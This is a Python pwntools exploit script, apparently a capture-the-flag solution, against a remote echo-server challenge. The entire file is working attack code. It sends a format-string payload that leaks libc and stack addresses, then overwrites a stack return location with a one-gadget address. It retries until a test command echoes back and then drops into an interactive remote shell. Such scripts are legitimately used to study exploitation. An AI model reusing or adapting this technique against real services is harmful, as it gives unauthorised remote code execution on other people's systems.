#!/usr/bin/python3
from pwn import *
from past.builtins import xrange
from time import sleep
from formatstring import *
import random

#Addr
gadget = 0xe58c3
stderr_libc = 0x3ec680

####Exploit
while True:
#	io = process('./server')
	io = remote('echoserver.darkarmy.xyz',32768)
	io.sendafter('> ',
			f'%c%c%c%c%c%c%c%{int(0xb8-0x7)}c%hhn'+\
			f'%{int(0xe0-0xb8)}c'+\
			f'%7$hhn'+\
			f'%6$p|%7$p')
	try:	
		io.recvuntil(b'`')

		libc_leak = int(io.recvn(14), 0)
		libc_base = libc_leak - stderr_libc
		print(f'Libc: {libc_base:#x}')
		stack_leak = int(io.recvn(15).strip().replace(b'|',b''),0)
		print(f'Stack: {stack_leak:#x}')

		settings = PayloadSettings(offset=36,arch=x86_64)
		p = WritePayload()
		p[stack_leak+0x20] = p32(libc_base+gadget&0xffffffff)
		payload = p.generate(settings)
		io.sendline(payload)
		io.sendline('echo \'ABCD\'')
		data = io.recvline()
		if b'ABCD' in data: break
		else: continue
	except: io.close(); continue
io.interactive()
